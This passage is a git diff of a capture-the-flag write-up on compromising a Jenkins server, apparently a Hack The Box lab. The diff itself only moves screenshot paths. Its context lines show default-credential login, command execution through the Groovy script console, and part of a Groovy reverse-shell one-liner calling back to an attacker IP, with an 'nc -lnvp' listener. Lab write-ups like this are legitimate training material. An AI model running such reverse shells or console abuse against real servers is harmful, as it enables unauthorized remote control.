@@ -87,7 +87,7 @@ curl -i http://10.129.92.121:8080/login?from=%2F
 	- `<input name="j_password" placeholder="Password" type="password" class="normal" aria-label="Password">`
 	- `<input name="from" type="hidden" value="/">`
 #### Browser
-![](Screenshot%202025-09-16%20at%2017.23.11.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.23.11.png)
 ### Research common Jenkins login credentials
 - https://docs.redhat.com/en/documentation/openshift_container_platform/3.3/html/using_images/other-images#initializing-jenkins
 ### Research other common admin credentials
@@ -118,12 +118,12 @@ curl -i http://10.129.92.121:8080/login?from=%2F
 - Key elements
 	- Signed in as `Administrator`
 	- `Groovy Script` build
-![](Screenshot%202025-09-16%20at%2017.37.19.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.37.19.png)
 ### Test access to Jenkins script console
 - Resource
 	- https://www.jenkins.io/doc/book/managing/script-console/
 - Result
-![](Screenshot%202025-09-16%20at%2017.42.14.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.42.14.png)
 ### Research Jenkins Groovy Scripts
 - Resources
 	- https://www.hackingarticles.in/jenkins-penetration-testing/
@@ -138,12 +138,12 @@ println "out> $sout err> $serr"
 ```
 ### Test Jenkins Groovy script
 - Script successfully ran
-![](Screenshot%202025-09-16%20at%2017.51.49.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.51.49.png)
 ### Explore directory contents - using Groovy script
 - Flag found in `/root` directory
-![](Screenshot%202025-09-16%20at%2017.53.26.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.53.26.png)
 ### Retrieve the flag - using Groovy script
-![](Screenshot%202025-09-16%20at%2017.54.29.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.54.29.png)
 ## Alternate Approach
 ### nmap scan
 - Useful resource
@@ -193,7 +193,7 @@ curl -i http://10.129.92.121:8080/login?from=%2F
 	- `<input name="j_password" placeholder="Password" type="password" class="normal" aria-label="Password">`
 	- `<input name="from" type="hidden" value="/">`
 #### Browser
-![](Screenshot%202025-09-16%20at%2017.23.11.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.23.11.png)
 ### Research common Jenkins login credentials
 - https://docs.redhat.com/en/documentation/openshift_container_platform/3.3/html/using_images/other-images#initializing-jenkins
 ### Research other common admin credentials
@@ -224,12 +224,12 @@ curl -i http://10.129.92.121:8080/login?from=%2F
 - Key elements
 	- Signed in as `Administrator`
 	- `Groovy Script` build
-![](Screenshot%202025-09-16%20at%2017.37.19.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.37.19.png)
 ### Test access to Jenkins script console
 - Resource
 	- https://www.jenkins.io/doc/book/managing/script-console/
 - Result
-![](Screenshot%202025-09-16%20at%2017.42.14.png)
+![](../Assets/Screenshot%202025-09-16%20at%2017.42.14.png)
 ### Research Jenkins Groovy Scripts
 - Resources
 	- https://www.hackingarticles.in/jenkins-penetration-testing/
@@ -247,7 +247,7 @@ String host="10.10.14.85";int port=5555;String cmd="sh";Process p=new ProcessBui
 nc -lnvp 5555
 ```
 #### Run Groovy script
-![](Screenshot%202025-09-17%20at%2011.47.35.png)
+![](../Assets/Screenshot%202025-09-17%20at%2011.47.35.png)
 #### Check reverse shell connection opened
 - Run an arbitrary command
 ```bash
